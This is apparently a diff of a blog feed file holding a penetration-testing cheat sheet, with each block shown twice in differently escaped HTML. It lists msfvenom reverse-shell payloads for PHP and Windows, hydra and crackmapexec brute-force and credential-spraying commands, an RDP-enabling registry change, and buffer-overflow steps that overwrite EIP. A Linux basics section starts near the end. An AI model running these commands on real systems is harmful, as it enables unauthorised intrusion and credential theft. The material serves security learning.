+msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; php/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;172.100.50.0 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell.php
 
-python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/sh")'</span> <span class="c"># Interactive shell</span>
-perl <span class="nt">-e</span> <span class="s1">'exec "/bin/sh";'</span>
-ruby: <span class="nb">exec</span> <span class="s2">"/bin/sh"</span>
-</code></pre></div></div>
+python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Interactive shell&lt;/span&gt;
+perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;exec &quot;/bin/sh&quot;;&apos;&lt;/span&gt;
+ruby: &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="mutations">Mutations</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john —wordlist<span class="o">=</span>file —rules —stdout <span class="o">&gt;</span> mutacao <span class="c"># New wordlist with variations of the first</span>
-nano /etc/john/john.conf → wordlist mode rules <span class="c"># Mutations personalized rules</span>
-    <span class="c"># ^[0-9] : 0 to 9 in the begin</span>
-    <span class="c"># $[0-9] : 0 to 9 in te final</span>
-    <span class="c"># $[@]$[0-9]$[0-9] : Add @ + 2 numbers in the end.</span>
+&lt;h3 id=&quot;mutations&quot;&gt;Mutations&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john —wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;file —rules —stdout &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; mutacao &lt;span class=&quot;c&quot;&gt;# New wordlist with variations of the first&lt;/span&gt;
+nano /etc/john/john.conf → wordlist mode rules &lt;span class=&quot;c&quot;&gt;# Mutations personalized rules&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# ^[0-9] : 0 to 9 in the begin&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# $[0-9] : 0 to 9 in te final&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# $[@]$[0-9]$[0-9] : Add @ + 2 numbers in the end.&lt;/span&gt;
 
-cewl google.com <span class="nt">-m</span> 7 <span class="c"># Find every word in the page with the lenght</span>
+cewl google.com &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 7 &lt;span class=&quot;c&quot;&gt;# Find every word in the page with the lenght&lt;/span&gt;
 
-crunch 10 10 <span class="nt">-t</span> rogerio^%% <span class="nt">-o</span> wordlist <span class="c"># List based in patterns</span>
-    <span class="c"># % : Numbers.</span>
-    <span class="c"># ^ : Special character.</span>
-    <span class="c"># @ : Lower case character.</span>
-    <span class="c"># , : Capital character.</span>
-</code></pre></div></div>
+crunch 10 10 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; rogerio^%% &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; wordlist &lt;span class=&quot;c&quot;&gt;# List based in patterns&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# % : Numbers.&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# ^ : Special character.&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# @ : Lower case character.&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# , : Capital character.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="key-space-brute-force">Key space brute force</h3>
-<p>All the possible variations.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 4 4 0123456789 <span class="nt">-o</span> pin <span class="c"># All combinations with 4 digits.</span>
+&lt;h3 id=&quot;key-space-brute-force&quot;&gt;Key space brute force&lt;/h3&gt;
+&lt;p&gt;All the possible variations.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crunch 4 4 0123456789 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; pin &lt;span class=&quot;c&quot;&gt;# All combinations with 4 digits.&lt;/span&gt;
 
-crunch 6 6 <span class="nt">-f</span> charset.lst numeric <span class="nt">-o</span> pin <span class="c"># Use the crunch numeric pattern</span>
-</code></pre></div></div>
+crunch 6 6 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; charset.lst numeric &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; pin &lt;span class=&quot;c&quot;&gt;# Use the crunch numeric pattern&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="brute-force">Brute force</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-v</span> <span class="nt">-l</span> rogerio <span class="nt">-p</span> admin 172.16.1.60 sbm <span class="c">#SMB</span>
-hydra <span class="nt">-v</span> <span class="nt">-L</span> users.txt <span class="nt">-p</span> pass.txt 172.16.1.60 sbm 
-hydra <span class="nt">-v</span> <span class="nt">-L</span> users.txt <span class="nt">-P</span> pass.txt <span class="nt">-M</span> alvos.txt sbm
-hydra <span class="nt">-L</span> rdp_users.txt <span class="nt">-P</span> rdp_pass.txt rdp://172.16.1.188 <span class="nt">-I</span> <span class="nt">-t</span> 1 <span class="c">#RDP</span>
-hydra <span class="nt">-v</span> L users.txt <span class="nt">-p</span> admin 172.16.1.5 ssh
-hydra <span class="nt">-v</span> <span class="nt">-L</span> users.txt <span class="nt">-P</span> password 172.16.1.5 <span class="nt">-t</span> 1 <span class="nt">-W</span> 5
-    <span class="c"># -s : Set port.</span>
-    <span class="c"># -t : Threads.</span>
-    <span class="c"># -W : Sleep time beetwen tasks.</span>
-</code></pre></div></div>
-<h3 id="winrm"><strong>WinRM</strong></h3>
-<p>Link:</p>
-<ul>
-  <li>[winrm-penetration-testing]https://www.hackingarticles.in/winrm-penetration-testing/
+&lt;h2 id=&quot;brute-force&quot;&gt;Brute force&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; rogerio &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; admin 172.16.1.60 sbm &lt;span class=&quot;c&quot;&gt;#SMB&lt;/span&gt;
+hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; pass.txt 172.16.1.60 sbm 
+hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; pass.txt &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; alvos.txt sbm
+hydra &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; rdp_users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; rdp_pass.txt rdp://172.16.1.188 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 1 &lt;span class=&quot;c&quot;&gt;#RDP&lt;/span&gt;
+hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; L users.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; admin 172.16.1.5 ssh
+hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password 172.16.1.5 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 5
+    &lt;span class=&quot;c&quot;&gt;# -s : Set port.&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# -t : Threads.&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# -W : Sleep time beetwen tasks.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;winrm&quot;&gt;&lt;strong&gt;WinRM&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;Link:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;[winrm-penetration-testing]https://www.hackingarticles.in/winrm-penetration-testing/
 Windows Remote Management, is a command-line tool that enables administrators to remotely execute the CMD.exe commands using the WS-Management protocol. Port 5985/HTTP, 5986/HTTPS.
 Evil-WinRM
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 172.16.1.140 <span class="nt">-u</span> user <span class="nt">-p</span> password
-</code></pre></div>    </div>
-  </li>
-</ul>
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 172.16.1.140 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="rdp">RDP</h3>
-<p>Active or disable rdp in windows</p>
-<ul>
-  <li>Active
-    <ul>
-      <li>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f</li>
-      <li>netsh advfirewall firewall set rule group=”remote desktop” new enable=Yes</li>
-    </ul>
-  </li>
-  <li>Disable
-    <ul>
-      <li>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 1 /f</li>
-      <li>netsh advfirewall firewall set rule group=”remote desktop” new enable=No</li>
-    </ul>
-  </li>
-</ul>
+&lt;h3 id=&quot;rdp&quot;&gt;RDP&lt;/h3&gt;
+&lt;p&gt;Active or disable rdp in windows&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Active
+    &lt;ul&gt;
+      &lt;li&gt;reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f&lt;/li&gt;
+      &lt;li&gt;netsh advfirewall firewall set rule group=”remote desktop” new enable=Yes&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Disable
+    &lt;ul&gt;
+      &lt;li&gt;reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 1 /f&lt;/li&gt;
+      &lt;li&gt;netsh advfirewall firewall set rule group=”remote desktop” new enable=No&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="crackmaexec">crackmaexec</h3>
-<p>Swiss knife for pentest</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec &lt;protocol&gt; &lt;target<span class="o">(</span>s<span class="o">)&gt;</span> <span class="nt">-u</span> username <span class="nt">-p</span> password
+&lt;h3 id=&quot;crackmaexec&quot;&gt;crackmaexec&lt;/h3&gt;
+&lt;p&gt;Swiss knife for pentest&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec &amp;lt;protocol&amp;gt; &amp;lt;target&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; username &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; password
 
-crackmaexec smb 172.16.1.0/24 <span class="nt">-u</span> jonh <span class="nt">-p</span> <span class="s1">'jonh@10'</span> <span class="c"># Scan the network to the test all logins</span>
-crackmaexec smb 172.16.1.60 <span class="nt">-u</span> jonh <span class="nt">-p</span> <span class="s1">'jonh@10'</span>  <span class="nt">-x</span> <span class="s1">'whoami'</span> <span class="c"># Execute this command</span>
+crackmaexec smb 172.16.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jonh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;jonh@10&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Scan the network to the test all logins&lt;/span&gt;
+crackmaexec smb 172.16.1.60 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jonh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;jonh@10&apos;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;whoami&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Execute this command&lt;/span&gt;
 
-crackmaexec ldap 192.168.1.0/24 <span class="nt">-u</span> user <span class="nt">-p</span> <span class="s1">'jonh@10'</span>
-crackmaexec ldap 192.168.1.0/24 <span class="nt">-u</span> user <span class="nt">-H</span> hashexemple
+crackmaexec ldap 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;jonh@10&apos;&lt;/span&gt;
+crackmaexec ldap 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; hashexemple
 
-crackmaexec mssql 192.168.1.0/24 <span class="nt">-u</span> userfile <span class="nt">-p</span> passwordfile <span class="nt">--no-bruteforce</span>
+crackmaexec mssql 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; userfile &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; passwordfile &lt;span class=&quot;nt&quot;&gt;--no-bruteforce&lt;/span&gt;
 
-crackmaexec winrm 192.168.1.0/24 <span class="nt">-u</span> userfile <span class="nt">-p</span> passwordfile <span class="nt">--no-bruteforce</span>
-</code></pre></div></div>
+crackmaexec winrm 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; userfile &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; passwordfile &lt;span class=&quot;nt&quot;&gt;--no-bruteforce&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="buffer-overflow">Buffer overflow</h2>
+&lt;h2 id=&quot;buffer-overflow&quot;&gt;Buffer overflow&lt;/h2&gt;
 
-<h3 id="pattern-offset">Pattern offset</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/msf-patter_create <span class="nt">-l</span> 2200 <span class="c"># Create pattern</span>
-/usr/bin/msf-pattern_offset <span class="nt">-l</span> 2200 <span class="nt">-q</span> 43396f43 <span class="c"># Find EIP overwrite</span>
-</code></pre></div></div>
-<h3 id="shellcode">Shellcode</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.0.16 <span class="nv">lport</span><span class="o">=</span>443 <span class="nv">exitfunc</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> c
-</code></pre></div></div>
+&lt;h3 id=&quot;pattern-offset&quot;&gt;Pattern offset&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/msf-patter_create &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 2200 &lt;span class=&quot;c&quot;&gt;# Create pattern&lt;/span&gt;
+/usr/bin/msf-pattern_offset &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 2200 &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 43396f43 &lt;span class=&quot;c&quot;&gt;# Find EIP overwrite&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;shellcode&quot;&gt;Shellcode&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.16 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nv&quot;&gt;exitfunc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;thread &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="gdblinux">GDB/Linux</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb <span class="nt">-q</span> ./file
-info functions               <span class="c"># Show functions</span>
-<span class="nb">set </span>disassembly-flavor intel <span class="c"># Set flavor</span>
-disas main                   <span class="c"># Dissasembly specific funtion</span>
-b<span class="k">*</span> 0x5655621f                <span class="c"># Breakpoint</span>
-run &lt; &lt;<span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print "A" * 200'</span><span class="o">)</span> <span class="c"># Input data</span>
-i r                          <span class="c"># Show registers(esp,eip,...)</span>
-x/16xw <span class="nv">$esp</span>                  <span class="c"># Specific memory zone</span>
-<span class="nb">break </span>main                   <span class="c"># Brakpoint in the funtion</span>
-<span class="nb">set</span> <span class="nv">$eip</span> <span class="o">=</span> 0x56556982        <span class="c"># Jump to specific function/zone</span>
-python <span class="nt">-c</span> <span class="s1">'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"'</span> | ./file <span class="c"># Send a specific number, that will allow overwrite and redirect the EIP.</span>
-</code></pre></div></div>]]></content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="exploitation" /><summary type="html"><![CDATA[This is a guide for exploitation]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/exploitation.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/exploitation.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Linux</title><link href="http://localhost:4000/cheatsheet/2022/01/13/linux.html" rel="alternate" type="text/html" title="Linux" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/13/linux</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/13/linux.html"><![CDATA[<h2 id="linux-enumerate">Linux enumerate</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man <span class="c"># manual of programs</span>
-<span class="nb">pwd</span> <span class="c"># Actula path.</span>
-<span class="nb">mkdir</span> <span class="c">#  Create directories</span>
-<span class="nb">ls</span> <span class="c"># List file</span>
-- <span class="nb">ls</span> <span class="nt">-l</span> <span class="c"># Show permissions, users and group, lenght and date</span>
-- <span class="nb">ls</span> <span class="nt">-a</span> <span class="c"># List hide files</span>
-- <span class="nb">ls</span> <span class="nt">-la</span> <span class="c"># List hide and permisions</span>
-<span class="nb">touch</span> <span class="c"># Create a file</span>
-<span class="nb">echo</span> <span class="c"># Write in screen</span>
-- <span class="nb">echo </span>exampletext <span class="o">&gt;</span> file <span class="c"># Save in a file</span>
-<span class="nb">cat</span> <span class="c"># Read the file</span>
-<span class="nb">cp</span> <span class="c"># Do a copy</span>
-<span class="nb">mv </span>file file1 <span class="c"># Move/rename the file</span>
-<span class="nb">head</span> <span class="c"># Read the first 5 lines</span>
-<span class="nb">tail</span> <span class="nt">-f</span> arquivoexemplo <span class="c"># Show in real time the end of file</span>
-<span class="c">## Users</span>
-/ect/passwd <span class="c"># Users list file</span>
-adduser nome <span class="c"># Create user</span>
-deluser nome <span class="c"># delete user</span>
-adduser nome <span class="nb">sudo</span> <span class="c"># Change permission to sudo </span>
-<span class="nb">cat</span> /var/log/auth.log <span class="c"># log of authentications </span>
-</code></pre></div></div>
+&lt;h3 id=&quot;gdblinux&quot;&gt;GDB/Linux&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./file
+info functions               &lt;span class=&quot;c&quot;&gt;# Show functions&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;disassembly-flavor intel &lt;span class=&quot;c&quot;&gt;# Set flavor&lt;/span&gt;
+disas main                   &lt;span class=&quot;c&quot;&gt;# Dissasembly specific funtion&lt;/span&gt;
+b&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 0x5655621f                &lt;span class=&quot;c&quot;&gt;# Breakpoint&lt;/span&gt;
+run &amp;lt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot; * 200&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Input data&lt;/span&gt;
+i r                          &lt;span class=&quot;c&quot;&gt;# Show registers(esp,eip,...)&lt;/span&gt;
+x/16xw &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;                  &lt;span class=&quot;c&quot;&gt;# Specific memory zone&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;break &lt;/span&gt;main                   &lt;span class=&quot;c&quot;&gt;# Brakpoint in the funtion&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x56556982        &lt;span class=&quot;c&quot;&gt;# Jump to specific function/zone&lt;/span&gt;
+python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot; * 136 + &quot;BBBB&quot; + &quot;\x70\x62\x55\x56&quot;&apos;&lt;/span&gt; | ./file &lt;span class=&quot;c&quot;&gt;# Send a specific number, that will allow overwrite and redirect the EIP.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="exploitation" /><summary type="html">This is a guide for exploitation</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/exploitation.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/exploitation.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Linux</title><link href="http://localhost:4000/cheatsheet/2022/01/13/linux.html" rel="alternate" type="text/html" title="Linux" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/13/linux</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/13/linux.html">&lt;h2 id=&quot;linux-enumerate&quot;&gt;Linux enumerate&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man &lt;span class=&quot;c&quot;&gt;# manual of programs&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Actula path.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#  Create directories&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List file&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Show permissions, users and group, lenght and date&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List hide files&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List hide and permisions&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Create a file&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Write in screen&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;exampletext &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file &lt;span class=&quot;c&quot;&gt;# Save in a file&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Read the file&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Do a copy&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;file file1 &lt;span class=&quot;c&quot;&gt;# Move/rename the file&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Read the first 5 lines&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; arquivoexemplo &lt;span class=&quot;c&quot;&gt;# Show in real time the end of file&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;## Users&lt;/span&gt;
+/ect/passwd &lt;span class=&quot;c&quot;&gt;# Users list file&lt;/span&gt;
+adduser nome &lt;span class=&quot;c&quot;&gt;# Create user&lt;/span&gt;
+deluser nome &lt;span class=&quot;c&quot;&gt;# delete user&lt;/span&gt;
+adduser nome &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Change permission to sudo &lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/log/auth.log &lt;span class=&quot;c&quot;&gt;# log of authentications &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="networks">Networks</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig <span class="c"># Network informations</span>
-service serviceexample restart <span class="c"># restart a service</span>
-netstat <span class="c"># Network open ports and configurations</span>
-traceroute <span class="c"># Trace the packages using TTL(Time to live).</span>
-hping3# MOst <span class="nb">complete </span>ping, can use SYN, port, etc.
+&lt;h3 id=&quot;networks&quot;&gt;Networks&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig &lt;span class=&quot;c&quot;&gt;# Network informations&lt;/span&gt;
